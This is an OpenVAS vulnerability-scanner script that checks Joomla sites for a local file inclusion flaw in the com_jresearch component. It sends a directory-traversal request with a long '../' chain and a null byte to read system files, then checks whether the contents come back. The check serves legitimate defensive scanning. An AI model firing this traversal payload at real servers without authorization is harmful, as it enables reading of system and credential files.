##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_com_jresearch_lfi_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Joomla Component 'com_jresearch' Local File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to perform directory
traversal attacks and read arbitrary files on the affected application.

Impact Level: Application.";

tag_affected = "Joomla jresearch component Version 1.2.2,Other versions may also
be affected.";

tag_insight = "The flaw is caused by improper validation of user-supplied input via
the 'controller' parameter in 'index.php', which allows attackers to read
arbitrary files via a ../(dot dot) sequences.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla and is prone to local file inclusion
vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902386");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Joomla Component 'com_jresearch' Local File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://www.1337day.com/exploits/16376");
  script_xref(name : "URL" , value : "http://www.exploit-id.com/web-applications/joomla-component-com_jresearch-local-file-inclusion");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("version_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();
foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(joomlaDir, "/index.php?option=com_jresearch&controller=../.." +
               "/../../../../../../../../../../../..", files[file],"%00");

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:joomlaPort, url:url, pattern:file))
  {
    security_message(port:joomlaPort);
    exit(0);
  }
}
